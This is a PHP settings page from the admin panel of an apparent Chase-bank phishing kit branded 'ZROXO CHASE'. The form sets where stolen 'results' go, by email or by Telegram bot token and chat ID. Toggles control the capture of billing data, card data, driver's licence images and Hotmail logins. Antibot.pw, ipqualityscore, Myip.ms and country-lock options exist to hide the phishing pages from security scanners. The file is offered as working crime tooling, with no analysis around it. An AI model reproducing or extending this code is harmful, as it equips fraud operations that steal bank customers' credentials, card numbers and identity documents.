<?php
error_reporting(0);
session_start();
if(!isset($_SESSION['login'])) {
    header("location: login.php");
}
include'config.php';

echo '<!DOCTYPE html>';
echo '<html>';
echo '<meta http-equiv="content-type" content="text/html;charset=utf-8" />';
echo '<head>';
echo '<meta charset="utf-8">';
echo '<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">';
echo '<title>ZROXO CHASE | Settings</title>';
echo '<link rel="icon" href="files/logo.png" type="image/png">';
echo '<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700">';
echo '<link rel="stylesheet" href="files/assets/vendor/nucleo/css/nucleo.css" type="text/css">';
echo '<link rel="stylesheet" href="files/assets/vendor/%40fortawesome/fontawesome-free/css/all.min.css" type="text/css">';
echo '<link rel="stylesheet" href="files/assets/css/argon.min5438.css?v=1.2.0" type="text/css">';
echo '</head>';
echo '';
echo '<body>';
echo '<style type="text/css">';
echo '';
echo '.bg-gradient-az{';
echo 'background: linear-gradient(87deg,#633b56 0,#f56036 100%)!important;';
echo '}.bg-gradient-ze {';
echo 'background: linear-gradient(87deg,#755f63 0,#e0d447 100%)!important;';
echo '}.bg-gradient-er {';
echo 'background: linear-gradient(87deg,#2dce89 0,#612e22 100%)!important;';
echo '}';
echo '@media only screen and (max-width: 600px) {';
echo '.col {';
echo 'max-width: 25%;';
echo '}';
echo '}';
echo '';
echo '</style>';
echo '<nav class="sidenav navbar navbar-vertical  fixed-left  navbar-expand-xs navbar-light bg-white" id="sidenav-main">';
echo '<div class="scrollbar-inner">';
echo '<!-- Brand -->';
echo '<div class="sidenav-header  d-flex  align-items-center">';
echo '<a class="navbar-brand" href="">';
echo '<img src="files/logo.png" class="navbar-brand-img" alt="...">';
echo '</a>';
echo '<div class=" ml-auto ">';
echo '<!-- Sidenav toggler -->';
echo '<div class="sidenav-toggler d-none d-xl-block" data-action="sidenav-unpin" data-target="#sidenav-main">';
echo '<div class="sidenav-toggler-inner">';
echo '<i class="sidenav-toggler-line"></i>';
echo '<i class="sidenav-toggler-line"></i>';
echo '<i class="sidenav-toggler-line"></i>';
echo '</div>';
echo '</div>';
echo '</div>';
echo '</div>';
echo '<div class="navbar-inner">';
echo '<!-- Collapse -->';
echo '<div class="collapse navbar-collapse" id="sidenav-collapse-main">';
echo '<!-- Nav items -->';
echo '<ul class="navbar-nav">';
echo '<li class="nav-item">';
echo '<a class="nav-link active" href="index.php" >';
echo '<i class="ni ni-shop text-primary"></i>';
echo '<span class="nav-link-text">Statistic</span>';
echo '</a>';
echo '</li>';
echo '<li class="nav-item">';
echo '<a class="nav-link" href="visitor.php" >';
echo '<i class="ni ni-ui-04 text-info"></i>';
echo '<span class="nav-link-text">List Result</span>';
echo '</a>';
echo '</li>';
echo '<li class="nav-item">';
echo '<a class="nav-link" href="settings.php" >';
echo '<i class="ni ni-settings text-pink"></i>';
echo '<span class="nav-link-text">Settings</span>';
echo '</a>';
echo '</li>';
echo '</ul>';
echo '<!-- Divider -->';
echo '<hr class="my-3">';
echo '</div>';
echo '</div>';
echo '</div>';
echo '</nav>';
echo '<!-- Main content -->';
echo '<div class="main-content" id="panel">';
echo '<!-- Topnav -->';
echo '<nav class="navbar navbar-top navbar-expand navbar-light bg-secondary border-bottom">';
echo '<div class="container-fluid">';
echo '<div class="collapse navbar-collapse" id="navbarSupportedContent">';
echo '';
echo '<!-- Navbar links -->';
echo '<ul class="navbar-nav align-items-center  ml-md-auto ">';
echo '<li class="nav-item d-xl-none">';
echo '<!-- Sidenav toggler -->';
echo '<div class="pr-3 sidenav-toggler sidenav-toggler-light" data-action="sidenav-pin" data-target="#sidenav-main">';
echo '<div class="sidenav-toggler-inner">';
echo '<i class="sidenav-toggler-line"></i>';
echo '<i class="sidenav-toggler-line"></i>';
echo '<i class="sidenav-toggler-line"></i>';
echo '</div>';
echo '</div>';
echo '</li>';
echo '</ul>';
echo '</div>';
echo '</div>';
echo '</nav>';
echo '<!-- Header -->';
echo '<div class="header pb-6">';
echo '<div class="container-fluid">';
echo '<div class="header-body">';
echo '<div class="row align-items-center py-4">';
echo '<div class="col-lg-6 col-7">';
echo '<nav aria-label="breadcrumb" class="d-none d-md-inline-block ml-md-4">';
echo '<ol class="breadcrumb breadcrumb-links">';
echo '<li class="breadcrumb-item"><a href="#"><i class="fas fa-home"></i></a></li>';
echo '<li class="breadcrumb-item"><a href="#">Settings</a></li>';
echo '</ol>';
echo '</nav>';
echo '</div>';
echo '';
echo '</div>';
echo '</div>';
echo '</div>';
echo '</div>';
echo '<!-- Page content -->';
echo '';
echo '<div class="container-fluid mt--6">';
echo '';
echo '<div class="row">';
echo '<div class="col-lg-6">';
echo '';
echo '<div class="card-wrapper">';
echo '<!-- Input groups -->';
echo '';
echo '<div class="card">';
echo '<!-- Card header -->';
echo '<div class="card-header">';
echo '<h3 class="mb-0">Settings</h3>';
echo '</div>';
echo '';
echo '<!-- Card body -->';
echo '<div class="card-body">';
echo '<form method="POST" action="update_settings.php">';
echo '<div class="form-group">';
echo '<label class="form-control-label" for="exampleFormControlInput1">EMAIL RESULT * :</label>';
echo '<input type="email" name="email_result_config" class="form-control" value="'.$email_result_config.'" >';
echo '</div>';
if ($redirect == "on") {
echo '<div class="form-group">';
echo '<label class="form-control-label" for="exampleFormControlInput1">REDIRECT PASSWORD :</label>';
echo '<input type="text" class="form-control" id="validationServerUsername" name="redirect_password" value="'.$redirect_password.'">';
echo '</div>';
}
echo '<div class="form-group">';
echo '<label class="form-control-label" for="exampleFormControlInput1">SEND FROM MAIL :</label>';
echo '<input type="email" class="form-control" name="result_from_email" value="'.$result_from_email.'">';
echo '</div>';
echo '<div class="form-group">';
echo '<label class="form-control-label" for="exampleFormControlInput1">RESULT PIN :</label>';
echo '<input type="num" class="form-control" name="result_pin" value="'.$result_pin.'">';
echo '</div>';
if ($antibot_pw == "on") {
echo '<div class="form-group">';
echo '<label class="form-control-label" for="exampleFormControlInput1">Antibot.pw KEY :</label>';
echo '<input type="num" class="form-control" name="antibot_pw_key" value="'.$antibot_pw_key.'">';
echo '</div>';
echo '<div class="form-group">';
echo '<label class="form-control-label" for="exampleFormControlInput1">ipqualityscore KEY :</label>';
echo '<input type="num" class="form-control" name="ipqualityscore_key" value="'.$ipqualityscore_key.'">';
echo '</div>';
}
if ($telegram_result == "on") {
echo '<div class="form-group">';
echo '<label class="form-control-label" for="exampleFormControlInput1">TELEGRAM TOKEN :</label>';
echo '<input type="num" class="form-control" name="telegram_token" value="'.$telegram_token.'">';
echo '</div>';
echo '<div class="form-group">';
echo '<label class="form-control-label" for="exampleFormControlInput1">TELEGRAM CHATID :</label>';
echo '<input type="num" class="form-control" name="telegram_chatid" value="'.$telegram_chatid.'">';
echo '</div>';
}
echo '<div class="form-group">';
echo '<label class="form-control-label" for="exampleFormControlInput1">Admin Password :</label>';
echo '<input type="num" class="form-control" name="admin_password" value="'.$admin_password.'">';
echo '</div>';
echo '<button class="btn btn-primary" type="submit">Submit</button>';
echo '</div>';
echo '</div>';
echo '<!-- Dropdowns -->';
echo '</div>';
echo '</div>';
echo '<div class="col-lg-6">';
echo '<div class="card-wrapper">';
echo '';
echo '<!-- Toggle buttons -->';
echo '<div class="card">';
echo '<!-- Card header -->';
echo '<div class="card-header">';
echo '<h3 class="mb-0">ON | OFF</h3>';
echo '</div>';
echo '<!-- Card body -->';
echo '';
echo '<div class="card-body">';
echo '<ul class="list-group list-group-flush list my--3">';
echo '<li class="list-group-item px-0">';
echo '<div class="row align-items-center">';
echo '<div class="col">';
echo '<h4 class="mb-0">Telegram result</h4>';
echo '</div>';
echo '<div class="col">';
echo '<label class="custom-toggle custom-toggle-success">';
if($telegram_result == "on"){
 echo '<input type="checkbox" checked="checked" name="telegram_result">';
}else{
 echo '<input type="checkbox" name="telegram_result">';
}
echo '<span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>';
echo '</label>';
echo '</div>';
echo '<div class="col">';
echo '<h4 class="mb-0">Default Protection</h4>';
echo '</div>';
echo '<div class="col">';
echo '<label class="custom-toggle custom-toggle-danger">';
echo '<input type="checkbox" checked="checked" name="default_protection" disabled>';
echo '<span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>';
echo '</label>';
echo '</div>';
echo '</div>';
echo '</li>';
echo '<li class="list-group-item px-0">';
echo '<div class="row align-items-center">';
echo '<div class="col">';
echo '<h4 class="mb-0">Mail result</h4>';
echo '</div>';
echo '<div class="col">';
echo '<label class="custom-toggle custom-toggle-success">';
if($email_result == "on"){
 echo '<input type="checkbox" checked="checked" name="email_result">';
}else{
 echo '<input type="checkbox" name="email_result">';
}
echo '<span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>';
echo '</label>';
echo '</div>';
echo '<div class="col">';
echo '<h4 class="mb-0">Lock Country</h4>';
echo '</div>';
echo '<div class="col">';
echo '<label class="custom-toggle custom-toggle">';
if($lock_country == "on"){
 echo '<input type="checkbox" checked="checked" name="lock_country">';
}else{
 echo '<input type="checkbox" name="lock_country">';
}
echo '<span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>';
echo '</label>';
echo '</div>';
echo '</div>';
echo '</li>';
echo '<li class="list-group-item px-0">';
echo '<div class="row align-items-center">';
echo '<div class="col">';
echo '<h4 class="mb-0">Redirect ON</h4>';
echo '</div>';
echo '<div class="col">';
echo '<label class="custom-toggle custom-toggle-success">';
if($redirect == "on"){
 echo '<input type="checkbox" checked="checked" name="redirect">';
}else{
 echo '<input type="checkbox" name="redirect">';
}
echo '<span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>';
echo '</label>';
echo '</div>';
echo '<div class="col">';
echo '<h4 class="mb-0">ipqualityscore</h4>';
echo '</div>';
echo '<div class="col">';
echo '<label class="custom-toggle custom-toggle-danger">';
if($ipqualityscore == "on"){
 echo '<input type="checkbox" checked="checked" name="ipqualityscore">';
}else{
 echo '<input type="checkbox" name="ipqualityscore">';
}
echo '<span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>';
echo '</label>';
echo '</div>';
echo '</div>';
echo '</li>';
echo '';
echo '<li class="list-group-item px-0">';
echo '<div class="row align-items-center">';
echo '<div class="col">';
echo '<h4 class="mb-0">Hotmail TrueLOGIN</h4>';
echo '</div>';
echo '<div class="col">';
echo '<label class="custom-toggle custom-toggle-info" >';
if($true_hotmail_login == "on"){
 echo '<input type="checkbox" checked="checked" name="true_hotmail_login">';
}else{
 echo '<input type="checkbox" name="true_hotmail_login">';
}
echo '<span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>';
echo '</label>';
echo '</div>';
echo '<div class="col">';
echo '<h4 class="mb-0">Myip.ms</h4>';
echo '</div>';
echo '<div class="col">';
echo '<label class="custom-toggle custom-toggle-danger">';
if($myip_ms == "on"){
 echo '<input type="checkbox" checked="checked" name="myip_ms">';
}else{
 echo '<input type="checkbox" name="myip_ms">';
}
echo '<span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>';
echo '</label>';
echo '</div>';
echo '</div>';
echo '</li>';
echo '<li class="list-group-item px-0">';
echo '<div class="row align-items-center">';
echo '<div class="col">';
echo '<h4 class="mb-0">Checker email</h4>';
echo '</div>';
echo '<div class="col">';
echo '<label class="custom-toggle custom-toggle-info" >';
if($valid_email_true == "on"){
 echo '<input type="checkbox" checked="checked" name="valid_email_true">';
}else{
 echo '<input type="checkbox" name="valid_email_true">';
}
echo '<span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>';
echo '</label>';
echo '</div>';
echo '<div class="col">';
echo '<h4 class="mb-0">Antibot.pw</h4>';
echo '</div>';
echo '<div class="col">';
echo '<label class="custom-toggle custom-toggle-danger">';
if($antibot_pw == "on"){
 echo '<input type="checkbox" checked="checked" name="antibot_pw">';
}else{
 echo '<input type="checkbox" name="antibot_pw">';
}
echo '<span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>';
echo '</label>';
echo '</div>';
echo '</div>';
echo '</li>';
echo '<li class="list-group-item px-0">';
echo '<div class="row align-items-center">';
echo '<div class="col">';
echo '<h4 class="mb-0">Billing Page</h4>';
echo '</div>';
echo '<div class="col">';
echo '<label class="custom-toggle custom-toggle-info" >';
if($Show_billing_page == "on"){
 echo '<input type="checkbox" checked="checked" name="Show_billing_page">';
}else{
 echo '<input type="checkbox" name="Show_billing_page">';
}
echo '<span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>';
echo '</label>';
echo '</div>';
echo '<div class="col">';
echo '<h4 class="mb-0">Card Page</h4>';
echo '</div>';
echo '<div class="col">';
echo '<label class="custom-toggle custom-toggle-danger">';
if($Show_card_page == "on"){
 echo '<input type="checkbox" checked="checked" name="Show_card_page">';
}else{
 echo '<input type="checkbox" name="Show_card_page">';
}
echo '<span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>';
echo '</label>';
echo '</div>';
echo '</div>';
echo '</li>';
echo '<li class="list-group-item px-0">';
echo '<div class="row align-items-center">';
echo '<div class="col">';
echo '<h4 class="mb-0">Get DL</h4>';
echo '</div>';
echo '<div class="col">';
echo '<label class="custom-toggle custom-toggle-info" >';
if($get_DL == "on"){
 echo '<input type="checkbox" checked="checked" name="get_DL">';
}else{
 echo '<input type="checkbox" name="get_DL">';
}
echo '<span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>';
echo '</label>';
echo '</div>';
echo '<div class="col">';
echo '<h4 class="mb-0">Only Mobile</h4>';
echo '</div>';
echo '<div class="col">';
echo '<label class="custom-toggle custom-toggle-success">';
if($only_mobile == "on"){
 echo '<input type="checkbox" checked="checked" name="only_mobile">';
}else{
 echo '<input type="checkbox" name="only_mobile">';
}
echo '<span class="custom-toggle-slider rounded-circle" data-label-off="No" data-label-on="Yes"></span>';
echo '</label>';
echo '</div>';
echo '</div>';
echo '</li>';
echo '';
echo '</ul>';
echo '</div>';
echo '</form>';
echo '</div>';
echo '<!-- Sliders -->';
echo '</div>';
echo '</div>';
echo '</div>';
echo '';
echo '';
echo '<!-- JS -->';
echo '<script src="files/assets/vendor/jquery/dist/jquery.min.js"></script>';
echo '<script src="files/assets/vendor/js-cookie/js.cookie.js"></script>';
echo '<script src="files/assets/js/argon.min5438.js?v=1.2.0"></script>';
echo '';
echo '</body>';
echo '</html>';
    unset($_SESSION["bad"]);
    unset($_SESSION["success"]);
    unset($_SESSION["wrong"]);
?>
